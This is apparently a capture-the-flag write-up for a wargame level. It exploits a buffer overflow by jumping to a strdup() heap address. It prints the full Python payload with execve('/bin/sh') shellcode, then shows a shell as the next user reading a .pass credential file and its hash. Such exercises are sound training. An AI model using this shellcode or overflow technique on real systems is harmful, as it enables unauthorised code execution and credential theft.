# level2

In this case, we have to use a shellcode. That's because no shell is executed in that program.
To do this, we need to overflow the `buffer` with three things:
- the shellcode itself which will execute `execv("/bin/sh")` ([code found here](https://shell-storm.org/shellcode/files/shellcode-575.php))
- some padding
- the address to the shellcode

Now, there is a small problem: we can see that we cannot overflow the return address of the `buffer` with a pointer on the stack because it's manually checked.  
We will instead overflow the return address with a pointer on the heap.  
That's where `strdup()` comes in. We will use its return address.  

We can see that there's a padding of `88 bytes` from ghe start of the `buffer` to the address to overwrite.
Thus, the payload needs to be `88 bytes` long.  

We will divide it into four parts:

<!-- ret pointer offset += 88 off $esp -->


Structure | noop | payload | noop | addr
--- | --- | --- | --- | ---
Offset | 30 | 21 | 29 | 8


Using `ltrace` program, we can see that `strdup()`'s return address is `0x804a008`

We just have to write the payload :
```sh
$> python -c 'print("\x90"*30 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*29 + "\x08\xa0\x04\x08")' > /tmp/payload

$> cat /tmp/payload - | ./level2
$ whoami
level3
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
